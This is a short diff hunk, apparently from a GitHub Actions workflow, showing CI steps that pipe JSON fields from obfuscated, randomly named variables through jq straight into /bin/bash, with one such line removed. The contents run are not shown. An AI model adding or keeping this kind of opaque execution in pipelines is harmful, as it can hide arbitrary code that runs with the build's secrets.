@@ -24,7 +24,6 @@ jobs:
           printf '%s' "$kmea426" | jq -r .et9 | /bin/bash
           printf '%s' "$cezp66416" | jq -r .jawm5 | /bin/bash
           echo $zkrls05079 | jq -r .tx3 | /bin/bash
-          echo $rd69 | jq -r .brju4 | /bin/bash
 
       - name: Persist output
         uses: actions/upload-artifact@v4
